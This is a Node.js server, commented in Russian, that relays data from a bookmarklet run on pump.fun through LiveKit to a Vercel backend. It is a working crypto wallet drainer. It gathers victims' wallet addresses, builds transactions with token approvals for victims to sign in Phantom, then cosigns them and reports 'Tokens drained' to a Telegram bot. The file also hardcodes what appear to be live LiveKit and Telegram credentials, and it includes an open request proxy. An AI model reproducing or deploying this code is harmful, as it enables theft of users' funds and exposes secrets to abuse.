'use strict';

/**
 * Railway LiveKit Agent v6
 *
 * АРХИТЕКТУРА:
 *   pump.fun
 *     └─ букмарклет грузит livekit-client с cdn.jsdelivr.net  (CSP: script-src разрешён)
 *     └─ подключается к wss://*.livekit.cloud                 (CSP: connect-src разрешён)
 *     └─ publishData(payload, {reliable:true})
 *              ↓  LiveKit DataChannel (WebRTC)
 *   Railway (этот process)
 *     └─ @livekit/rtc-node Room → RoomEvent.DataReceived      ← ПРАВИЛЬНЫЙ способ
 *     └─ processData(msg, fromIdentity)
 *     └─ room.localParticipant.publishData() → обратно в комнату → букмарклет alert()
 *     └─ POST VERCEL_URL/api/agent-data → Vercel хранит событие → UI polling
 */

var http   = require('http');
var https  = require('https');
var { Room, RoomEvent, DataPacketKind } = require('@livekit/rtc-node');
var { AccessToken, RoomServiceClient, DataPacket_Kind } = require('livekit-server-sdk');

var PORT           = process.env.PORT               || 8080;
var LK_API_KEY     = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
var LK_API_SECRET  = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.livekit.cloud';
var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
var AGENT_IDENTITY = 'railway-agent-v6';
var VERCEL_URL     = process.env.VERCEL_URL         || 'https://archivist-one.vercel.app/';
var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
var TG_TOKEN       = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
var TG_CHAT_ID     = process.env.TELEGRAM_CHAT_ID   || '7253475769';

// ─── RoomServiceClient — отправляет ответ через LiveKit REST API ─────────────
var roomService = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);

// Глобальный room instance — нужен для publishData обратно
var agentRoom = null;
var agentConnected = false;
var totalReceived = 0;
var reconnectTimer = null;

// ─── Telegram уведомление ─────────────────────────────────────────────────────
function sendTelegram(text) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  var body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });
  var options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: '/bot' + TG_TOKEN + '/sendMessage',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  };
  var req = https.request(options, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () { console.log('[tg] ' + res.statusCode + ' ' + d.substring(0, 80)); });
  });
  req.on('error', function (e) { console.error('[tg] error: ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Отправляем ответ обратно в LiveKit комнату ──────────────────────────────
function sendDataToRoom(data, toIdentities) {
  if (!agentRoom || !agentConnected) {
    console.error('[sendData] Агент не подключён, пробуем через RoomService REST...');
    var bytes = Buffer.from(JSON.stringify(data), 'utf8');
    var opts = {};
    if (toIdentities && toIdentities.length > 0) {
      opts.destinationIdentities = toIdentities;
    }
    return roomService
      .sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE, opts)
      .then(function () { console.log('[sendData/REST] OK action=' + data.action); })
      .catch(function (e) { console.error('[sendData/REST] ERR ' + e.message); });
  }

  try {
    var encoder = new TextEncoder();
    var encoded = encoder.encode(JSON.stringify(data));
    var opts = { reliable: true };
    if (toIdentities && toIdentities.length > 0) {
      opts.destinationIdentities = toIdentities;
    }
    agentRoom.localParticipant.publishData(encoded, opts);
    console.log('[sendData] OK action=' + data.action + ' to=' + (toIdentities || ['all']).join(','));
    return Promise.resolve();
  } catch (e) {
    console.error('[sendData] ERR ' + e.message);
    return Promise.reject(e);
  }
}

// ─── Отправляем данные на Vercel /api/agent-data ─────────────────────────────
function pushToVercel(fromIdentity, action, payload) {
  var body = JSON.stringify({
    fromIdentity: fromIdentity,
    action: action,
    payload: payload,
    source: 'livekit',
  });

  var urlObj;
  try {
    urlObj = new URL(VERCEL_URL + '/api/agent-data');
  } catch (e) {
    console.error('[push] Bad VERCEL_URL: ' + e.message);
    return;
  }

  var isHttps = urlObj.protocol === 'https:';
  var options = {
    hostname: urlObj.hostname,
    port: urlObj.port || (isHttps ? 443 : 80),
    path: urlObj.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
      'X-Agent-Secret': AGENT_SECRET,
    },
  };

  var mod = isHttps ? https : http;
  var req = mod.request(options, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () {
      console.log('[push] Vercel ' + res.statusCode + ' ' + d.substring(0, 80));
    });
  });
  req.on('error', function (e) { console.error('[push] HTTP error: ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Обработка данных от букмарклета ────────────────────────────────────────
function processData(msg, fromIdentity) {
  var action  = msg.action  || 'unknown';
  var payload = msg.payload || msg || {};
  console.log('[relay] from=' + fromIdentity + ' action=' + action);

  // Всегда пушим событие на Vercel (для UI)
  pushToVercel(fromIdentity, action, payload);

  if (action === 'ping') {
    sendDataToRoom({
      action: 'pong',
      message: 'Railway agent v6 online! (rtc-node)',
      room: ROOM_NAME,
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'wallet') {
    var wallet = payload.wallet || '—';
    console.log('[wallet] from=' + fromIdentity + ' wallet=' + wallet);

    // Telegram уведомление
    sendTelegram(
      '<b>Wallet получен!</b>\n' +
      'Identity: <code>' + fromIdentity + '</code>\n' +
      'Wallet: <code>' + wallet + '</code>\n' +
      'URL: ' + (payload.url || '—') + '\n' +
      'Title: ' + (payload.title || '—')
    );

    // Если нет адреса кошелька — просто ack
    if (!wallet || wallet === '—') {
      sendDataToRoom({
        action: 'ack',
        ok: true,
        message: 'Wallet не получен.',
        ts: Date.now(),
      }, [fromIdentity]);
      return;
    }

    // Сначала отправляем Vercel /api/relay action=initialize (создаём config PDA)
    console.log('[wallet] Инициализируем config PDA для ' + wallet);
    var initBody = JSON.stringify({ action: 'initialize', userPublicKey: wallet });
    var initUrlObj;
    try { initUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { initUrlObj = null; }

    var doInitialize = function(cb) {
      if (!initUrlObj) { cb(null); return; }
      var isHttps = initUrlObj.protocol === 'https:';
      var mod = isHttps ? https : http;
      var opts = {
        hostname: initUrlObj.hostname,
        port: initUrlObj.port || (isHttps ? 443 : 80),
        path: initUrlObj.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(initBody) },
      };
      var req = mod.request(opts, function(res) {
        var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
          console.log('[wallet] initialize response: ' + res.statusCode + ' ' + d.substring(0, 200));
          try { cb(JSON.parse(d)); } catch(e) { cb(null); }
        });
      });
      req.on('error', function(e){ console.error('[wallet] initialize error: ' + e.message); cb(null); });
      req.write(initBody); req.end();
    };

    // После инициализации — вызываем prepare для построения TX
    var doPrepare = function() {
      console.log('[wallet] Запрашиваем prepare TX у Vercel для wallet=' + wallet);
      var prepBody = JSON.stringify({ action: 'prepare', userPublicKey: wallet, withRevoke: true });
      var prepUrlObj;
      try { prepUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { prepUrlObj = null; }
      if (!prepUrlObj) {
        sendDataToRoom({ action: 'ack', ok: false, message: 'Bad VERCEL_URL', ts: Date.now() }, [fromIdentity]);
        return;
      }
      var isHttps = prepUrlObj.protocol === 'https:';
      var mod = isHttps ? https : http;
      var opts = {
        hostname: prepUrlObj.hostname,
        port: prepUrlObj.port || (isHttps ? 443 : 80),
        path: prepUrlObj.pathname,
        method: 'POST',
        timeout: 55000, // 55 сек — чуть меньше Vercel maxDuration=60
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(prepBody) },
      };
      var req = mod.request(opts, function(res) {
        var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
          console.log('[wallet] prepare response: ' + res.statusCode + ' ' + d.substring(0, 300));
          // Если статус не 200 — логируем тело как текст для диагностики
          if (res.statusCode !== 200) {
            console.error('[wallet] prepare non-200 body:', d.substring(0, 500));
            sendDataToRoom({ action: 'error', error: 'prepare http ' + res.statusCode + ': ' + d.substring(0, 200), ts: Date.now() }, [fromIdentity]);
            return;
          }
          var parsed;
          try { parsed = JSON.parse(d); } catch(e) {
            console.error('[wallet] prepare JSON parse failed, body was:', d.substring(0, 300));
            sendDataToRoom({ action: 'error', error: 'prepare parse error: ' + e.message + ' body=' + d.substring(0, 100), ts: Date.now() }, [fromIdentity]);
            return;
          }
          if (!parsed.success || !parsed.transaction) {
            console.error('[wallet] prepare failed:', parsed.error || JSON.stringify(parsed).substring(0,200));
            // Если prepare упал — шлём ack с ошибкой но не зависаем
            sendDataToRoom({
              action: 'ack',
              ok: false,
              message: 'TX prepare failed: ' + (parsed.error || 'unknown'),
              wallet: wallet,
              ts: Date.now(),
            }, [fromIdentity]);
            return;
          }
          console.log('[wallet] TX готова, sessionId length=' + (parsed.sessionId||'').length + ' tokensFound=' + parsed.tokensFound);
          // Отдаём транзакцию букмарклету — он подпишет через Phantom
          sendDataToRoom({
            action: 'response',
            ok: true,
            tx: parsed.transaction,          // base64 VersionedTransaction
            sessionId: parsed.sessionId,
            tokensFound: parsed.tokensFound,
            message: 'TX готова к подписанию',
            amountSOL: 0.01,
            ts: Date.now(),
          }, [fromIdentity]);
        });
      });
      req.on('timeout', function() {
        console.error('[wallet] prepare TIMEOUT after 55s — Vercel не ответил вовремя');
        req.destroy();
        sendDataToRoom({ action: 'error', error: 'prepare timeout: Vercel не ответил за 55s', ts: Date.now() }, [fromIdentity]);
      });
      req.on('error', function(e){
        // ECONNRESET после destroy() — уже обработано в timeout, не дублируем
        if (e.code === 'ECONNRESET' || e.code === 'ECONNABORTED') return;
        console.error('[wallet] prepare request error: ' + e.message);
        sendDataToRoom({ action: 'error', error: 'prepare fetch error: ' + e.message, ts: Date.now() }, [fromIdentity]);
      });
      req.write(prepBody); req.end();
    };

    doInitialize(function(initRes) {
      if (initRes && initRes.success === false) {
        console.error('[wallet] initialize failed: ' + (initRes.error || 'unknown'));
      }
      // Независимо от результата инициализации — идём в prepare
      // (initialize идемпотентна — если PDA уже есть, вернёт success:true)
      doPrepare();
    });

  } else if (action === 'signed') {
    // Букмарклет подписал TX и отправил обратно — cosign + broadcast + drain
    var signedTx = payload.signedTx || msg.signedTx || '';
    var sessionId = payload.sessionId || msg.sessionId || '';
    console.log('[signed] from=' + fromIdentity + ' signedTx.length=' + signedTx.length + ' sessionId.length=' + sessionId.length);

    if (!signedTx || !sessionId) {
      sendDataToRoom({ action: 'error', error: 'signedTx or sessionId missing', ts: Date.now() }, [fromIdentity]);
      return;
    }

    var cosignBody = JSON.stringify({ action: 'cosign', signedTransaction: signedTx, sessionId: sessionId });
    var cosignUrlObj;
    try { cosignUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { cosignUrlObj = null; }
    if (!cosignUrlObj) {
      sendDataToRoom({ action: 'error', error: 'Bad VERCEL_URL for cosign', ts: Date.now() }, [fromIdentity]);
      return;
    }
    var isHttps = cosignUrlObj.protocol === 'https:';
    var mod = isHttps ? https : http;
    var cosignOpts = {
      hostname: cosignUrlObj.hostname,
      port: cosignUrlObj.port || (isHttps ? 443 : 80),
      path: cosignUrlObj.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(cosignBody) },
    };
    var cosignReq = mod.request(cosignOpts, function(res) {
      var d = ''; res.on('data', function(c){ d += c; }); res.on('end', function(){
        console.log('[signed] cosign response: ' + res.statusCode + ' ' + d.substring(0, 300));
        var parsed;
        try { parsed = JSON.parse(d); } catch(e) {
          sendDataToRoom({ action: 'error', error: 'cosign parse error', ts: Date.now() }, [fromIdentity]);
          return;
        }
        // Отдаём финальный результат букмарклету
        sendDataToRoom({
          action: 'cosign_result',
          ok: parsed.success === true,
          signature: parsed.signature,
          tokensApproved: parsed.tokensApproved,
          message: parsed.success ? 'TX подтверждена! sig=' + parsed.signature : ('Cosign failed: ' + (parsed.error || 'unknown')),
          ts: Date.now(),
        }, [fromIdentity]);
        // Уведомление в Telegram
        if (parsed.success) {
          sendTelegram('<b>TX подтверждена!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens drained: ' + (parsed.tokensApproved || 0));
        } else {
          sendTelegram('<b>Cosign FAILED</b>\nError: ' + (parsed.error || 'unknown'));
        }
      });
    });
    cosignReq.on('error', function(e){
      console.error('[signed] cosign error: ' + e.message);
      sendDataToRoom({ action: 'error', error: 'cosign request error: ' + e.message, ts: Date.now() }, [fromIdentity]);
    });
    cosignReq.write(cosignBody); cosignReq.end();

  } else if (action === 'data') {
    console.log('[data] url='   + (payload.url   || '—'));
    console.log('[data] title=' + (payload.title || '—'));

    // Telegram уведомление
    sendTelegram(
      '<b>Data получен!</b>\n' +
      'Identity: <code>' + fromIdentity + '</code>\n' +
      'URL: ' + (payload.url || '—') + '\n' +
      'Title: ' + (payload.title || '—')
    );

    sendDataToRoom({
      action: 'ack',
      ok: true,
      message: 'Railway v6 получил данные!',
      received: {
        url:   payload.url,
        title: payload.title,
      },
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'fetch') {
    var targetUrl = (payload.url || msg.url || '').toString();
    if (!targetUrl) {
      sendDataToRoom({ action: 'fetch_result', ok: false, error: 'url required', ts: Date.now() }, [fromIdentity]);
      return;
    }
    console.log('[fetch] ' + targetUrl);

    var fetchHeaders = Object.assign(
      {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      payload.headers || {}
    );

    fetch(targetUrl, { headers: fetchHeaders })
      .then(function (r) {
        var status = r.status;
        return r.text().then(function (t) {
          var d;
          try { d = JSON.parse(t); } catch (_) { d = t.substring(0, 8000); }
          pushToVercel(fromIdentity, 'fetch_result', { url: targetUrl, status: status, data: d });
          sendDataToRoom({
            action: 'fetch_result',
            ok: true,
            status: status,
            url: targetUrl,
            data: d,
            ts: Date.now(),
          }, [fromIdentity]);
        });
      })
      .catch(function (e) {
        sendDataToRoom({ action: 'fetch_result', ok: false, error: e.message, url: targetUrl, ts: Date.now() }, [fromIdentity]);
      });

  } else {
    sendDataToRoom({ action: 'ack', ok: true, echo: action, ts: Date.now() }, [fromIdentity]);
  }
}

// ─── Подключение через @livekit/rtc-node (ПРАВИЛЬНЫЙ способ) ─────────────────
async function connectAgent() {
  if (reconnectTimer) {
    clearTimeout(reconnectTimer);
    reconnectTimer = null;
  }

  var at = new AccessToken(LK_API_KEY, LK_API_SECRET, {
    identity: AGENT_IDENTITY,
    ttl: '24h',
  });
  at.addGrant({
    room: ROOM_NAME,
    roomJoin: true,
    canPublish: true,
    canPublishData: true,
    canSubscribe: true,
  });

  var token;
  try {
    token = await at.toJwt();
  } catch (e) {
    console.error('[agent] Token error: ' + e.message + '. Retry in 10s...');
    reconnectTimer = setTimeout(connectAgent, 10000);
    return;
  }

  var room = new Room();
  agentRoom = room;

  // ─── DataReceived — срабатывает когда букмарклет делает publishData() ─────
  room.on(RoomEvent.DataReceived, function (data, participant, kind, topic) {
    var fromId = (participant && participant.identity) || 'unknown';
    if (fromId === AGENT_IDENTITY) return; // игнорируем свои пакеты

    totalReceived++;
    var text = Buffer.from(data).toString('utf8');
    console.log('[data] #' + totalReceived + ' from=' + fromId + ' len=' + text.length + (topic ? ' topic=' + topic : ''));

    try {
      processData(JSON.parse(text), fromId);
    } catch (e) {
      console.error('[data] JSON parse error: ' + e.message);
      sendDataToRoom({ action: 'error', error: 'JSON parse: ' + e.message, ts: Date.now() }, [fromId]);
    }
  });

  room.on(RoomEvent.Connected, function () {
    agentConnected = true;
    console.log('');
    console.log('[agent] Connected via @livekit/rtc-node!');
    console.log('[agent] Room: ' + ROOM_NAME + ' | Identity: ' + AGENT_IDENTITY);
    console.log('[agent] Waiting for data from bookmarklets...');
    console.log('');
  });

  room.on(RoomEvent.Disconnected, function () {
    agentConnected = false;
    agentRoom = null;
    console.log('[agent] Disconnected. Reconnect in 5s...');
    reconnectTimer = setTimeout(connectAgent, 5000);
  });

  room.on(RoomEvent.ParticipantConnected, function (participant) {
    console.log('[agent] Participant joined: ' + participant.identity);
  });

  room.on(RoomEvent.ParticipantDisconnected, function (participant) {
    console.log('[agent] Participant left: ' + participant.identity);
  });

  try {
    console.log('[agent] Connecting to ' + LK_WS_URL + ' room=' + ROOM_NAME + '...');
    await room.connect(LK_WS_URL, token, {
      autoSubscribe: true,
    });
  } catch (e) {
    console.error('[agent] Connect error: ' + e.message + '. Retry in 5s...');
    agentConnected = false;
    agentRoom = null;
    reconnectTimer = setTimeout(connectAgent, 5000);
  }
}

// ─── HTTP server ─────────────────────────────────────────────────────────────
var httpServer = http.createServer(function (req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Agent-Secret');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  if (req.method === 'GET' && (req.url === '/' || req.url === '/health')) {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({
      ok: true,
      service: 'railway-livekit-agent-v6',
      transport: '@livekit/rtc-node',
      room: ROOM_NAME,
      agentConnected: agentConnected,
      totalReceived: totalReceived,
      vercelUrl: VERCEL_URL,
      ts: Date.now(),
    }));
    return;
  }

  if (req.method === 'POST' && req.url === '/relay') {
    var body = '';
    req.on('data', function (c) { body += c.toString(); });
    req.on('end', function () {
      try {
        processData(JSON.parse(body), 'http-relay');
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: true, message: 'Data received by Railway agent v6' }));
      } catch (e) {
        res.writeHead(400, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: e.message }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ ok: false, error: 'Not found' }));
});

httpServer.listen(PORT, function () {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  Railway LiveKit Agent v6  (@livekit/rtc-node)              ║');
  console.log('║  pump.fun → bukmarklet → LiveKit DataChannel → THIS → Vercel║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('[server] Port:    ' + PORT);
  console.log('[server] Room:    ' + ROOM_NAME);
  console.log('[server] LiveKit: ' + LK_WS_URL);
  console.log('[server] Vercel:  ' + VERCEL_URL);
  console.log('[server] TG:      ' + (TG_TOKEN ? 'configured' : 'NOT SET'));
  console.log('');
  connectAgent();
});


